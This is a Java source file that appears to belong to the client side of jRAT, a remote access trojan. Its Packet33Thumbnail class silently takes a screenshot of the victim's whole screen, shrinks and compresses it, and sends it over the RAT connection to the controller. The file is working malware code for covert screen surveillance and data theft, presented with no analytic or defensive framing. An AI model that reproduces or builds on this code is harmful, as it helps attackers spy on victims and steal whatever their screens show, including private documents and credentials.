package jrat.client.packets.outgoing;

import jrat.client.Connection;
import jrat.common.utils.ImageUtils;
import jrat.common.utils.Utils;

import java.awt.*;
import java.awt.image.BufferedImage;

public class Packet33Thumbnail implements OutgoingPacket {

	private int width;
	private int height;
	
	public Packet33Thumbnail(int width, int height) {
		this.width = width;
		this.height = height;
	}

	@Override
	public void write(Connection con) throws Exception {
		if (!Utils.isHeadless()) {
			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage screenShot = new Robot().createScreenCapture(screenRect);
			screenShot = ImageUtils.resize(screenShot, width, height);

			byte[] buffer = ImageUtils.encode(screenShot, 0.5F);
			con.writeInt(buffer.length);
			con.write(buffer);
		}
	}

	@Override
	public short getPacketId() {
		return 33;
	}

}
